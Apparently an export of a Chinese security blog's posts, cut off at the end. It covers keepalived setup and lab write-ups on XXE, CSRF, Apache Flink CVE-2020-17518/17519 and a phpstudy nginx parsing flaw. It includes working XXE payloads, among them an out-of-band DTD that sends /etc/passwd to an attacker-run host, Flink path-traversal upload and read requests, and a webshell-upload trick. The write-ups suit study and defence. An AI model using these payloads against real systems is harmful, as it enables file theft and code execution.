class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install keepalived -y</span><br></pre></td></tr></table></figure><p>安装完成之后在etc里有keepalived目录，里面就是配置文件。</p><p><img src="https://b3logfile.com/file/2020/10/image-98f626ec.png"></p><p><strong>keepalived配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#全局定义</span><br><span class="line">global_defs &#123;</span><br><span class="line">  notification_email &#123;</span><br><span class="line">    acassen@firewall.loc</span><br><span class="line">    failover@firewall.loc</span><br><span class="line">    sysadmin@firewall.loc</span><br><span class="line">  &#125;</span><br><span class="line">  notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line">  smtp_ server 192.168.73.11</span><br><span class="line">  smtp_connect_timeout 30</span><br><span class="line">  router_id LVS_DEVEL # LVS_DEVEL这字段在/etc/hosts文件中看；通过它访问到主机</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#检查脚本</span><br><span class="line">vrrp_script chk_http_ port &#123;</span><br><span class="line">  script &quot;/usr/local/src/nginx_check.sh&quot;</span><br><span class="line">  interval 2   # (检测脚本执行的间隔)2s</span><br><span class="line">  weight 2  #权重，如果这个脚本检测为真，服务器权重+2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#虚拟IP</span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">  state MASTER  # 备份服务器上将MASTER 改为BACKUP</span><br><span class="line">  interface ens33 //网卡名称</span><br><span class="line">  virtual_router_id 51 # 主、备机的virtual_router_id必须相同</span><br><span class="line">  priority 100   #主、备机取不同的优先级，主机值较大，备份机值较小</span><br><span class="line">  advert_int 1  #每隔1s发送一次心跳</span><br><span class="line">  authentication &#123;  # 校验方式， 类型是密码，密码1111</span><br><span class="line">        auth type PASS</span><br><span class="line">        auth pass 1111</span><br><span class="line">    &#125;</span><br><span class="line">  virtual_ipaddress &#123; # 虛拟ip</span><br><span class="line">    192.168.73.50 // VRRP H虛拟ip地址</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>router_id LVS_DEVEL 唯一标识</p><p><img src="https://b3logfile.com/file/2020/10/image-5c60426b.png"></p><p><strong>检查脚本nginx_check.sh</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">A=`ps -C nginx -no-header | wc - 1`</span><br><span class="line">if [ $A -eq 0];then</span><br><span class="line">  /usr/local/webserver/nginx/sbin</span><br><span class="line">  sleep 2</span><br><span class="line">  if [`ps -C nginx --no-header| wc -1` -eq 0 ];then</span><br><span class="line">    killall keepalived</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><code>systemctl start keepalived </code></p><p>启动nginx&#x2F;keepalived</p><p><code> ps -ef | grep keepalived</code></p><p><img src="https://b3logfile.com/file/2020/10/image-f5fd1a7e.png"></p><p>查看虚拟IP</p><p><img src="https://b3logfile.com/file/2020/10/image-40331343.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-2a64b551.png" alt="image.png"></p><p>关闭nginx服务</p><p><img src="https://b3logfile.com/file/2020/10/image-3c37ae5b.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-8a0abd3c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞原理及简单利用</title>
      <link href="/posts/18655/"/>
      <url>/posts/18655/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h3><hr><p>XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><hr><p>XML可以从外部读取DTD文件的话，那么就可以想一下，如果把读取文件的路径换成另一个文件的路径，那么是否可以读取到这个文件。如果把路径指向一个内网端口，是否能探测内部端口。另外，服务器解析XML，要么一次性加载，要么是一部分一部分的去加载，递归调用XML定义，一次性调用超量的定义，那么服务器内存就会消耗光，造成拒绝服务攻击。</p><ul><li>读取文件</li><li>命令执行</li><li>内网探测</li><li>DDOS攻击</li><li>钓鱼</li></ul><h3 id="简单XXE漏洞代码编写"><a href="#简单XXE漏洞代码编写" class="headerlink" title="简单XXE漏洞代码编写"></a>简单XXE漏洞代码编写</h3><hr><ol><li>常用函数介绍</li></ol><p>file_get_contents()函数把整个文件读入一个字符串中</p><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>simplexml_load_string函数</p><p>将xml格式字符串转换为对应的simpleXMLElement</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$note</span>=<span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;note&gt;&lt;name&gt;aaa&lt;/name&gt;&lt;age&gt;12&lt;/age&gt;&lt;/note&gt;</span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$note</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>XML注入回显 输出函数</p><p>print_r()</p><p>编写简单的XXE漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);  <span class="comment">//有回显</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eg.</p><p>环境搭建</p><p><img src="https://b3logfile.com/file/2020/10/image-33b70112.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-a76cda90.png" alt="image.png"></p><p>读取本地文件payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>使用bp抓包</p><p><img src="https://b3logfile.com/file/2020/10/image-beb7584b.png" alt="image.png"></p><p>修改请求方式，上传payload，读取C盘下的Windows.ini这个文件</p><p><img src="https://b3logfile.com/file/2020/10/image-dbd01e8f.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-1a5186d6.png" alt="image.png"></p><p>成功读取到这个文件。</p><h3 id="漏洞利用-任意文件读取"><a href="#漏洞利用-任意文件读取" class="headerlink" title="漏洞利用-任意文件读取"></a>漏洞利用-任意文件读取</h3><p>php中测试POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure><p>读取文件（有回显）</p><p>paylaod</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/test/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2020/10/image-70693e73.png" alt="image.png"></p><p>读取php文件</p><p><img src="https://b3logfile.com/file/2020/10/image-868045af.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-325e35d3.png" alt="image.png"></p><p>读取文件（无回显）</p><p><code>print_r($data); </code>输出了我们查询的结果，如果没有这个函数的话，只有使用Blind XXE来构建一条带外信道提取数据。</p><p><img src="https://b3logfile.com/file/2020/10/image-ded7f0f7.png" alt="image.png"></p><p>请求服务器，服务器会再次向我们搭建的服务器请求dtd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.73.134/test.dtd&quot;&gt;</span><br><span class="line">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>构造服务器的dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#x27;http://192.168.73.134/test.php?con=%p1;&#x27;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure><p>服务器请求到这个dtd之后，会开始解析。然后把得到的密码通过请求参数再次访问我们的服务器，从而造成数据外带，我们可以通过抓包获取到信息。</p><h3 id="XXE漏洞发现与防御"><a href="#XXE漏洞发现与防御" class="headerlink" title="XXE漏洞发现与防御"></a>XXE漏洞发现与防御</h3><p>抓包引用外部实体来探测是否存在XXE漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> <span class="string">&quot;This is test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如何防御？</p><ul><li>禁用外部实体</li><li>过滤用户提交的参数（XML的关键词）</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://www.freebuf.com/column/181064.html">https://www.freebuf.com/column/181064.html</a></p><p><a href="https://pentesterlab.com/exercises/play_xxe/course">https://pentesterlab.com/exercises/play_xxe/course</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈CSRF漏洞原理</title>
      <link href="/posts/26169/"/>
      <url>/posts/26169/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><p>跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p><p><strong>CSRF和XSS的区别</strong></p><ul><li>xss利用站点内的信任用户，盗取cookie。</li><li>csrf通过伪装成受信任用户请求受信任网站</li></ul><h3 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h3><p>一个用户正常访问登陆一个网站（A）之后，用户会存下A的cookie。当用户未退出网站并在同一浏览器中去访问恶意网站（B）。B发出向A的请求，浏览器接收到这个请求之后，会带上A的cookie去请求A。A不知道这是B的恶意请求，会根据用户的cookie信息和权限处理这个请求，这样就导致B的恶意请求被执行。</p><p><img src="https://b3logfile.com/file/2020/10/image-9a7d4dd3.png" alt="image.png"></p><p>利用目标用户的合法身份，以目标用户的名义执行某些非法的操作。</p><p><strong>eg.</strong></p><p>假设去登陆一个网站</p><p><img src="https://b3logfile.com/file/2020/10/image-0960c913.png" alt="image.png"></p><p>登陆成功之后，我们这个用户拥有更改密码的权限。</p><p><img src="https://b3logfile.com/file/2020/10/image-28b85a04.png" alt="image.png"></p><p>更改密码</p><p><img src="https://b3logfile.com/file/2020/10/image-d6e7e5ca.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-76ea3776.png" alt="image.png"></p><p>这就是浏览正常网站的操作流程。</p><p>修改密码的链接 <a href="">http://localhost//testinfo/update.php?user=aaa&amp;passwd=456</a></p><p>构造恶意链接<a href=""> http://localhost//testinfo/update.php?user=aaa&amp;passwd=123456</a></p><p>然后我们在去访问这个恶意链接</p><p><img src="https://b3logfile.com/file/2020/10/image-df4ab9e7.png" alt="image.png"></p><p><em>代码示例</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//会话验证cookie 确保用户登陆</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line"><span class="comment">//更改密码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>CSRF利用条件</strong></p><ul><li>用户已经登陆</li><li>用户访问对应url</li></ul><h3 id="漏洞利用的一些技巧"><a href="#漏洞利用的一些技巧" class="headerlink" title="漏洞利用的一些技巧"></a>漏洞利用的一些技巧</h3><ol><li>链接利用</li><li>img标签利用</li><li>iframe利用</li><li>css-background利用</li></ol><blockquote><p>iframe标签内容将在页面加载过程中自动进行加载，src指向的位置就是页面请求的地址。</p></blockquote><blockquote><p>注意：iframe加载会出现白框，可以设置iframe的style-&gt;display：none，来不显示iframe加载内容。</p></blockquote><p>可以利用css中background样式中的url来加载远程机器上的内容，从而对url中的内容发送http请求。</p><p>eg.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>:<span class="number">#00FF00</span> <span class="built_in">url</span>(<span class="string">a.gif</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PSOT型CSRF可以设置表单用于提交，使用hidden属性来隐藏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;123456&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF防御措施"><a href="#CSRF防御措施" class="headerlink" title="CSRF防御措施"></a>CSRF防御措施</h3><ul><li>二次验证（js验证）取决于用户，不建议使用</li><li>http referer头</li><li>设置token</li><li>http自定义头</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink（CVE-2020-17518&amp;&amp;CVE-2020-17519）漏洞复现</title>
      <link href="/posts/40618/"/>
      <url>/posts/40618/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><strong>CVE-2020-17518：通过REST API写入远程文件</strong></p><p>影响版本：Flink 1.5.1-1.11.2</p><p>Flink 1.5.1引入了REST API，可通过修改HTTP HEADER将任意文件写入到文件系统的任意位置。</p><p><strong>CVE-2020-17519：通过REST API读取远程文件</strong></p><p>影响版本 Flink 1.11.0-1.11.2</p><p>Flink 1.11.0-1.11.2中引入的一项更改，允许攻击者通过JobManager进程的REST接口读取本地文件系统上的任何文件，访问仅限于JobManager可访问的文件。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载vulhub</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>进入目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/flink/CVE-2020-17518</span><br></pre></td></tr></table></figure><p>安装环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2021/01/image-e7124b46.png" alt="image.png"></p><p>访问</p><p><img src="https://b3logfile.com/file/2021/01/image-9cddfee5.png" alt="image.png"></p><p>这里版本为1.11.2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>CVE-2020-17518复现</strong></p><p>构造数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: your ip:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/flag&quot;</span><br><span class="line"></span><br><span class="line">This is flag </span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2021/01/image-4733072e.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2021/01/image-848c825c.png" alt="image.png"></p><p>也可以通过CVE-2020-17519来进行读取</p><p><strong>CVE-2020-17519复现</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your ip:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflag</span><br></pre></td></tr></table></figure><p><code>%252f</code> 是 <code>/</code> 的二次编码</p><p>直接访问可读取到文件信息</p><p><img src="https://b3logfile.com/file/2021/01/image-8a74e05a.png" alt="image.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到安全版本</p><p>Flink 1.11.3或Flink 1.12.0</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E">https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E</a><br><a href="https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E">https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy_nginx 解析漏洞</title>
      <link href="/posts/19714/"/>
      <url>/posts/19714/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2020年09月03日，360CERT监测发现 phpstudy 发布了 phpstudy 安全配置错误漏洞 的风险通告，漏洞等级：高危，漏洞评分：7.6。</p><p>phpStudy 存在 nginx 解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行的影响。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>phpstudy:phpstudy : &lt;&#x3D;8.1.0.7</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>主要是nginx配置不当造成的解析漏洞，与php、nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。</p><p>环境配置如下（win10 + phpstudy）</p><p><img src="https://b3logfile.com/file/2020/11/image-292148ed.png" alt="image.png"></p><p>写一个文件上传页面上传文件(html+php)</p><p><img src="https://b3logfile.com/file/2020/11/image-7d89efa0.png" alt="image.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传图片马，<code>copy 1.jpg/b + tset.php/a webshell.jpg </code>这个命令制作完成后有点问题，所以直接更改php的后缀，也可以在网上找图片马。</p><p><img src="https://b3logfile.com/file/2020/11/image-f492fef6.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/11/image-37ac7baf.png" alt="image.png"></p><p>这里得到了图片存储的路径，然后访问这张图片 <code>http://192.168.73.146/upload/test.jpg</code></p><p><img src="https://b3logfile.com/file/2020/11/image-be3ca030.png" alt="image.png"></p><p>直接使用paylaod <code>http://192.168.73.146/upload/test.jpg/xxx.php</code>造成解析漏洞</p><p><img src="https://b3logfile.com/file/2020/11/image-d2a9dfb3.png" alt="image.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>http://192.168.73.146/upload/test.jpg/xxx.php </code> 访问一个不存在的php文件为什么对上一层的jpg文件进行了解析？既然是配置不当，就去看看它们的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen        80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root   &quot;C:/phpstudy_pro/WWW&quot;;</span><br><span class="line">        location / &#123;</span><br><span class="line">            index index.php index.html;</span><br><span class="line">            error_page 400 /error/400.html;</span><br><span class="line">            error_page 403 /error/403.html;</span><br><span class="line">            error_page 404 /error/404.html;</span><br><span class="line">            error_page 500 /error/500.html;</span><br><span class="line">            error_page 501 /error/501.html;</span><br><span class="line">            error_page 502 /error/502.html;</span><br><span class="line">            error_page 503 /error/503.html;</span><br><span class="line">            error_page 504 /error/504.html;</span><br><span class="line">            error_page 505 /error/505.html;</span><br><span class="line">            error_page 506 /error/506.html;</span><br><span class="line">            error_page 507 /error/507.html;</span><br><span class="line">            error_page 509 /error/509.html;</span><br><span class="line">            error_page 510 /error/510.html;</span><br><span class="line">            autoindex  off;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过正则找到php文件并把它交给fastcgi处理,<code>fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</code> 这个配置的意思是在浏览器中访问.php文件，读取$document_root（网站根目录）下的.php文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问此URL http://192.168.73.146/upload/test.jpg/xxx.php </span><br><span class="line">nginx 传递给fastcgi的值 /../../upload/test.jpg/xxx.php</span><br></pre></td></tr></table></figure><p>这里怎么访问了上层的test.jpg文件呢？在fastcgi处理xxx.php这个文件的时候，发现没有这个php文件，这时 <code>php.ini</code> 配置文件中 <code>cgi.fix_pathinfo=1</code> 这个参数就会修复路径，采用上层的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设一个路径,cgi依次检查</span><br><span class="line">/../../upload/test.jpg/xxx.php/aaa.php/bbb.php</span><br><span class="line">/../../upload/test.jpg/xxx.php/aaa.php</span><br><span class="line">/../../upload/test.jpg/xxx.php</span><br><span class="line">/../../upload/test.jpg</span><br></pre></td></tr></table></figure><p>到了这里 